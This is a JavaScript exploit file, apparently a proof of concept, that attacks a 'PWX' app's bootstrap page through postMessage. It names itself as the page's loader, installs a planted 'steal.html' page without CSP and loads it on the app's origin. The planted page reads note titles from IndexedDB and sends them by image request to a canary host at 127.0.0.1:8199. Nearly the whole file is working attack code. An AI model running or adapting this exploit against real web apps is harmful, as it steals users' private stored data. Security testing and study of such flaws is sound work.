// Exploit: open a PWX app origin's bootstrap page top-level, name ourselves as the loader in its
// URL fragment, send it an "install" of our own file with no CSP, then load that file on the
// app origin. It runs with the app's origin, so it can read the app's stored data.
const TARGET = new URLSearchParams(location.search).get("target");
const CANARY = "http://127.0.0.1:8199";
const stealer = `<!doctype html><script>(async () => {
  async function readNotes() {
  const titles = [];
  for (const [name, storeName] of [["pwx-notes", "notes"], ["pwx-app-store", "kv"]]) {
    try {
      const db = await new Promise((ok, no) => { const r = indexedDB.open(name); r.onsuccess = () => ok(r.result); r.onerror = no; });
      if (!db.objectStoreNames.contains(storeName)) continue;
      const all = await new Promise((ok) => { const q = db.transaction(storeName).objectStore(storeName).getAll(); q.onsuccess = () => ok(q.result); });
      for (const n of all) if (n && n.title) titles.push(n.title);
    } catch (e) { titles.push("error:" + (e && e.name)); }
  }
  return titles.join("|") || "none";
}
  new Image().src = "${CANARY}/leak/bootstrap-hijack?d=" + encodeURIComponent(await readNotes());
})();</script>`;
document.getElementById("go").addEventListener("click", async () => {
  const w = window.open(TARGET + "/__pwx/bootstrap.html#loader=" + encodeURIComponent(location.origin), "_blank");
  await new Promise((r) => setTimeout(r, 3000));
  w.postMessage({ type: "install", files: { "app/steal.html": new TextEncoder().encode(stealer) }, headers: {} }, TARGET);
  await new Promise((r) => setTimeout(r, 2000));
  w.location = TARGET + "/app/steal.html";
  document.body.dataset.done = "1";
});
